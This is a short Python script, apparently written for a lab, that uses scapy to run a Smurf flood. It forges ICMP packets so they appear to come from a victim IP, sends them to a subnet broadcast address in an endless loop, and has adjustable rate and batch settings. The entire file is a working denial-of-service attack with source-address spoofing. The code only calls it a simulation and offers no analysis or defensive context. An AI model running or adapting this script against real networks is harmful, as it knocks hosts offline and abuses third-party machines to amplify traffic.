import time

from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send


def smurf_flood(victim_ip, broadcast_ip, interval=10, count_per_batch=1):

    print(f"Starting continuous Smurf simulation to victim {victim_ip} via broadcast {broadcast_ip}...\n")
    try:
        while True:
            packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()
            send(packet, count=count_per_batch, verbose=True)
            print(f"Sent {count_per_batch} packet(s) to broadcast. Waiting {interval} seconds...\n")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nSimulation stopped by user.")


if __name__ == "__main__":

    victim_ip = "192.168.56.5"
    broadcast_ip="192.168.56.255"

    smurf_flood(victim_ip, broadcast_ip, interval=10, count_per_batch=1)